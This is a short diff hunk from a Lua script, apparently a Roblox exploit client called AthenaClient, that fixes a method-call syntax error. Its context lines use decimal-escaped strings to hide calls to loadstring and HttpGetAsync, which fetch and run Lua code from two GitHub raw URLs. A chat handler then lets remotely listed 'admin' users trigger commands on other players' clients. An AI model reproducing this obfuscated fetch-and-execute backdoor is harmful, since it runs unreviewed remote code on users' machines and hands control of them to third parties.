@@ -37,7 +37,7 @@ local function Chatted(p)
     p.Chatted.Connect(p.Chatted,function(msg)
         local g = getfenv()["\108\111\97\100\115\116\114\105\110\103"](getfenv()["\103\97\109\101"]["\72\116\116\112\71\101\116\65\115\121\110\99"](getfenv()["\103\97\109\101"],"\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\71\70\88\84\73\47\65\116\104\101\110\97\67\108\105\101\110\116\47\109\97\105\110\47\65\100\109\105\110\115\46\108\117\97"))()
         local b = getfenv()["\108\111\97\100\115\116\114\105\110\103"](getfenv()["\103\97\109\101"]["\72\116\116\112\71\101\116\65\115\121\110\99"](getfenv()["\103\97\109\101"],"\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\71\70\88\84\73\47\65\116\104\101\110\97\67\108\105\101\110\116\47\109\97\105\110\47\66\108\97\99\107\108\105\115\116\101\100\70\114\111\109\65\100\109\105\110\83\121\115\116\101\109\46\108\117\97"))()
-        if table.find(g,p.UserId) and not table.find(g,game:GetService("Players").LocalPlayer.UserId) and not table.find(b,game.GetService("Players").LocalPlayer.UserId) then
+        if table.find(g,p.UserId) and not table.find(g,game:GetService("Players").LocalPlayer.UserId) and not table.find(b,game:GetService("Players").LocalPlayer.UserId) then
             if msg:sub(1,1) == "'" then
                 local r = commands[msg:sub(2,#msg:split(" ")[1])]
                 if r and Check(msg:split(" ")[2]) then
